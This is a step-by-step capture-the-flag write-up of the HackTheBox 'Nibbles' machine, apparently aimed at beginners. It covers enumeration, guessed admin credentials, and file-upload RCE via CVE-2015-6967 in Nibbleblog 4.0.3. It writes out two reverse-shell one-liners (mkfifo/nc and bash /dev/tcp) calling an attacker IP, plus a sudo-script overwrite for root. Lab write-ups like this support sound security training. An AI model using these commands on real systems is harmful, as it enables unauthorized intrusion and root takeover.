# Nibbles — HackTheBox

| Field | Detail |
|---|---|
| OS | Linux |
| Difficulty | Easy |
| IP | 10.129.5.88 |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/nibbles](https://jostif.pages.dev/writeups/nibbles) |

**Techniques:** HTML comment path leak → Nibbleblog 4.0.3 (CVE-2015-6967) → context-based creds (admin:nibbles) → authenticated file upload RCE → reverse shell → sudo misconfiguration (writable script) → root

---

---

## Table of Contents
1. [What You'll Learn](#what-youll-learn)
2. [Methodology Overview](#methodology-overview)
3. [Reconnaissance](#reconnaissance)
4. [Web Enumeration](#web-enumeration)
5. [Foothold — Nibbleblog RCE](#foothold--nibbleblog-rce)
6. [Privilege Escalation](#privilege-escalation)
7. [Flags](#flags)
8. [Key Takeaways](#key-takeaways)

---

## What You'll Learn

This box is perfect for beginners. By the end you'll understand:

- How to approach a Linux machine from scratch
- How to enumerate a web application and identify its CMS
- What an **authenticated file upload vulnerability** is and how it leads to RCE
- How to upgrade from a web shell to a proper reverse shell
- How to exploit a **misconfigured sudo rule** for privilege escalation
- Why **password guessing / context-based credentials** is always worth trying

---

## Methodology Overview

Every HTB machine (and real pentest) follows the same general flow:

```
Recon → Enumeration → Exploitation → Post-Exploitation → Privesc → Root
```

We never skip steps. Even if something looks obvious, we enumerate thoroughly — you'll often find things that surprise you.

---

## Reconnaissance

### Setting Up Variables

First things first — store the target IP and your own IP in environment variables. You'll type them dozens of times; this saves you from mistakes.

```bash
export IP=10.129.5.88
export Lhost=10.10.14.78   # your tun0 IP (run: ip a show tun0)
export Lport=4444
```

### Nmap — Port Scanning

We start with a full TCP port scan. The flags we're using:

| Flag | Meaning |
|------|---------|
| `-sC` | Run default scripts (grabs banners, checks for common vulns) |
| `-sV` | Version detection (what software is running?) |
| `-p-` | Scan all 65535 ports, not just the top 1000 |
| `--min-rate 5000` | Send at least 5000 packets/sec — speeds things up |
| `-oN nmap_full.txt` | Save results to a file |

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt $IP
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

**What this tells us:**

- **Port 22 (SSH):** Standard Linux remote access. We can't do much here without credentials, but we keep it in mind for later.
- **Port 80 (HTTP):** A web server is running. This is almost always where the attack begins on easy boxes.

The Apache version `2.4.18` and OpenSSH `7.2p2` on Ubuntu tell us this is an older system — likely with fewer patches. That's a good sign for us.

---

## Web Enumeration

### Visiting the Web Server

Open your browser and navigate to `http://10.129.5.88`. You'll see a near-empty page with just the text:

```
Hello world!
```

Not much to look at. But before you give up — **always view the page source** (Right-click → View Page Source, or `Ctrl+U`). This is one of the most important habits in web pentesting.

In the source you'll find a comment left by the developer:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Developers often leave comments like this thinking nobody will see them. In reality, it's a direct pointer to a hidden path. Navigate to `http://10.129.5.88/nibbleblog/`.

You now see a blog — running on **Nibbleblog**, a PHP-based blogging platform.

### Directory Brute-Forcing with Feroxbuster

Finding the blog is great, but we need to map out everything inside it. We use **Feroxbuster**, a fast recursive directory bruter written in Rust.

```bash
feroxbuster -u http://10.129.5.88/nibbleblog \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x xml \
  -t 100 \
  --scan-dir-listings
```

**Flag breakdown:**

| Flag | Meaning |
|------|---------|
| `-u` | Target URL |
| `-w` | Wordlist to use |
| `-x xml` | Also try `.xml` extensions (useful since Nibbleblog stores data in XML) |
| `-t 100` | 100 threads — fast |
| `--scan-dir-listings` | When a directory listing is visible, enumerate those paths too |

**Notable findings:**

```
/nibbleblog/admin/            ← Admin panel
/nibbleblog/admin.php         ← Admin login page
/nibbleblog/content/private/config.xml   ← Configuration file
/nibbleblog/content/private/users.xml    ← User data (if accessible)
```

The fact that `content/private/` is accessible is a misconfiguration. In a properly secured server, these files would not be readable from the web.

### Identifying the CMS Version

Browse to `http://10.129.5.88/nibbleblog/admin.php` — you'll see a login form. Before trying to log in, let's confirm what version of Nibbleblog is running.

Check `http://10.129.5.88/nibbleblog/content/private/config.xml`. Inside you'll find version information confirming this is **Nibbleblog 4.0.3**.

Now search for public exploits:

```bash
searchsploit nibbleblog
```

Or simply Google: `Nibbleblog 4.0.3 exploit`

You'll find **CVE-2015-6967**: an authenticated file upload vulnerability in the `my_image` plugin that allows uploading a PHP file and executing arbitrary code.

**Key word: authenticated.** We need valid credentials first.

### Finding Credentials — Context-Based Guessing

The admin username is often `admin` on small blogs and CMS installs — that's a reasonable first guess.

For the password, think about the box name: **Nibbles**. The password `nibbles` is a classic HTB hint — machine names often relate to credentials on easier boxes. Always try the obvious before running a wordlist attack.

```
Username: admin
Password: nibbles
```

> **Why does this work in real life?** Weak, predictable passwords based on the application name, company name, or service name are extremely common. This is called a **context-based credential attack** — using information about the target to guess passwords intelligently before resorting to brute force.

Also worth noting: Nibbleblog has a **blacklist-based rate limiter** (see `admin/boot/rules/4-blacklist.bit`). If you send too many wrong passwords, your IP gets blocked. This is exactly why intelligent guessing beats blind brute-forcing here.

---

## Foothold — Nibbleblog RCE

### The Vulnerability

With valid credentials, we can exploit **CVE-2015-6967**. The `my_image` plugin in Nibbleblog 4.0.3 lets you upload an image — but it doesn't validate the file type. You can upload a `.php` file instead, which Apache will execute when you visit the URL.

This is called a **File Upload to Remote Code Execution (RCE)** vulnerability. It's one of the most common and impactful web vulnerabilities.

### Using the Public Exploit

Clone a ready-made exploit:

```bash
git clone https://github.com/hadrian3689/nibbleblog_4.0.3.git
cd nibbleblog_4.0.3
```

First, verify you have RCE:

```bash
python3 nibbleblog_4.0.3.py \
  -t http://10.129.5.88/nibbleblog/admin.php \
  -u admin \
  -p nibbles \
  -rce whoami
```

Output:
```
nibbler
```

We're executing commands as the `nibbler` user. This is our foothold.

### Why a Web Shell Isn't Enough

The exploit gives us a "fake" shell — each command spawns a fresh HTTP request. You can't `cd` into a directory and have it persist, you can't run interactive programs, and it's fragile. We need a **real reverse shell**.

### Getting a Proper Reverse Shell

A **reverse shell** is when the target machine connects back to us, giving us an interactive terminal. Here's why we do it this way:

- The target is likely behind a firewall that blocks *incoming* connections to it
- But it can usually make *outgoing* connections
- We listen on our machine; the target calls us

**Step 1:** Start your listener (on your Kali machine):

```bash
nc -lvnp 4444
```

| Flag | Meaning |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS resolution |
| `-p 4444` | Port to listen on |

**Step 2:** Trigger the reverse shell:

```bash
python3 nibbleblog_4.0.3.py \
  -t http://10.129.5.88/nibbleblog/admin.php \
  -u admin \
  -p nibbles \
  -rce 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.78 4444 >/tmp/f'
```

**Breaking down the payload:**

```bash
rm /tmp/f              # Remove any existing named pipe
mkfifo /tmp/f          # Create a named pipe (FIFO) — a special file for IPC
cat /tmp/f             # Read from the pipe (blocks, waiting for input)
| /bin/sh -i 2>&1      # Pipe that input into an interactive shell; redirect stderr to stdout
| nc 10.10.14.78 4444  # Send output to our listener
>/tmp/f                # Loop the output back into the pipe
```

This creates a full duplex communication channel. You'll see the connection in your `nc` listener.

---

## Privilege Escalation

### Enumeration as nibbler

With our shell, first check what `nibbler` can do as root:

```bash
sudo -l
```

Output:
```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

This is a **sudo misconfiguration**. The admin gave `nibbler` permission to run a specific shell script as root — without a password. This is intended to be a maintenance script.

The critical insight: **we own the file**. `/home/nibbler/personal/stuff/monitor.sh` is in `nibbler`'s home directory. We can overwrite it with anything we want.

But first — the directory doesn't exist yet.

### Unzipping the Archive

In `/home/nibbler` there's a `personal.zip`:

```bash
cd /home/nibbler
unzip personal.zip
```

This creates `personal/stuff/monitor.sh`. Now we can overwrite it.

### Overwriting the Script

We'll replace `monitor.sh` with a command that spawns another reverse shell — this time as root.

On your Kali machine, start a second listener:

```bash
nc -lvnp 4445
```

On the target, overwrite the script:

```bash
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo 'bash -i >& /dev/tcp/10.10.14.78/4445 0>&1' >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
```

**What does `bash -i >& /dev/tcp/IP/PORT 0>&1` do?**

- `bash -i` — spawn an interactive bash shell
- `/dev/tcp/IP/PORT` — Linux's built-in TCP pseudo-device; writing to it opens a TCP connection
- `>&` — redirect both stdout and stderr to that connection
- `0>&1` — redirect stdin from the same connection (so we can send commands)

Now execute it with sudo:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

Your second listener catches a shell as root:

```bash
root@Nibbles:/home/nibbler# whoami
root
```

---

## Flags

```bash
# User flag
cat /home/nibbler/user.txt
3ad7e44158f536f0b52bf0b01d011c09

# Root flag
cat /root/root.txt
f418c539237eaf44b00b92811f3f53ea
```

---

## Key Takeaways

### 1. Always View Page Source
The `/nibbleblog/` path was hidden in an HTML comment. Developers leave breadcrumbs all the time. `Ctrl+U` before you assume a page is empty.

### 2. Enumerate Thoroughly
Feroxbuster found config files, admin panels, and plugin paths that would have taken hours to find manually. Always run a directory bruter against web targets.

### 3. Context-Based Credentials > Wordlists (Sometimes)
The password `nibbles` would never appear early in `rockyou.txt`. But it's the obvious guess given the box name. Think before you blast.

### 4. Know Your CVEs
Once you identify a CMS and version, search for CVEs immediately. `Nibbleblog 4.0.3` → `CVE-2015-6967` is a well-documented path. Learn to use `searchsploit` and Google effectively.

### 5. Upgrade Your Shell
A webshell from an exploit script is noisy, stateless, and fragile. Always upgrade to a proper reverse shell as soon as you have RCE.

### 6. `sudo -l` Is Your First Privesc Check
Always run `sudo -l` the moment you land on a Linux machine. Sudo misconfigurations are one of the most common privesc paths on HTB and in real environments.

### 7. Writable Files in Sudo Rules Are Instant Root
If you can write to a file that's allowed in sudoers, you own root. The script path matters — not the script content.

---

## Attack Chain Summary

```
Nmap: ports 22, 80
  → HTTP: view-source reveals /nibbleblog/
    → Feroxbuster: finds /admin.php, config.xml, plugin paths
      → CMS: Nibbleblog 4.0.3 → CVE-2015-6967
        → Credentials: admin:nibbles (context-based guess)
          → File upload RCE via my_image plugin
            → Reverse shell as nibbler
              → sudo -l: monitor.sh (NOPASSWD)
                → personal.zip extracted, script overwritten
                  → sudo → root shell
```

---

*Written by J0stif | [jostif.pages.dev](https://jostif.pages.dev)*
